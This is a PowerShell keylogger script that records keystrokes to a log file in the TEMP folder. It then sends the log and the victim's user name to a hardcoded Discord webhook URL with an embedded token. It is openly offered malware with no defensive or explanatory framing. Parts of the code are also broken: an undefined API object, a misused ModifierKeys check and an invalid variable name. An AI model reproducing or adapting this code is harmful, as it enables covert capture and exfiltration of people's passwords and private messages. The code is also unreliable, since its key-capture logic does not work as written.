# PowerShell Keylogger
# Created by: C0SM0

# Webhook URL (CHANGE ME)
$webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40mQiRLo6enK1A4YajR8qR0jExZTA4zuPr6i7c4G4SYUCSpPxzhllBke"

# Write the current process ID to a file
$PID > "$env:TEMP\keylogger_pid.txt"

# Load necessary assemblies for key logging
Add-Type -AssemblyName System.Windows.Forms

# Keylogger function
function KeyLogger($logFile = "$env:TEMP\keylogger.log") {
    # Create the log file if it doesn't exist
    if (-not (Test-Path $logFile)) {
        New-Item -Path $logFile -ItemType File -Force
    }

    # Attempt to log keystrokes
    try {
        while ($true) {
            Start-Sleep -Milliseconds 40

            for ($ascii = 9; $ascii -le 254; $ascii++) {
                # Use API to get key state
                $keystate = [System.Windows.Forms.Control]::ModifierKeys

                # Check if the key is pressed
                if ($keystate -eq -32767) {
                    $null = [console]::CapsLock

                    # Map virtual key
                    $mapKey = [System.Windows.Forms.Control]::ModifierKeys

                    # Create a StringBuilder for the logged character
                    $keyboardState = New-Object Byte[] 256
                    $hideKeyboardState = [System.Windows.Forms.Control]::ModifierKeys
                    $loggedchar = New-Object -TypeName System.Text.StringBuilder

                    # Translate virtual key
                    if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                        # Add logged key to file
                        [System.IO.File]::AppendAllText($logFile, $loggedchar.ToString(), [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    catch {
        # Log any errors for debugging
        $errorMessage = "Error in KeyLogger: $_"
        Add-Content -Path "$env:TEMP\error_log.txt" -Value $errorMessage -Force
        Write-Host $errorMessage
    }
    finally {
        # Send logs via webhook
        try {
            $logs = Get-Content "$logFile" | Out-String
            $Body = @{
                'username' = $env:User Name
                'content' = $logs
            }

            # Convert the hashtable to a JSON string
            $JsonBody = $Body | ConvertTo-Json

            # Send the message to the webhook
            $response = Invoke-RestMethod -Uri $webhook -Method 'POST' -Body $JsonBody -ContentType 'application/json'
            Write-Host "Logs sent successfully: $response"
        } catch {
            # Log any errors when sending the logs
            $errorMessage = "Error sending logs: $_"
            Add-Content -Path "$env:TEMP\error_log.txt" -Value $errorMessage -Force
            Write-Host $errorMessage
        }
    }
}

# Run the keylogger
KeyLogger
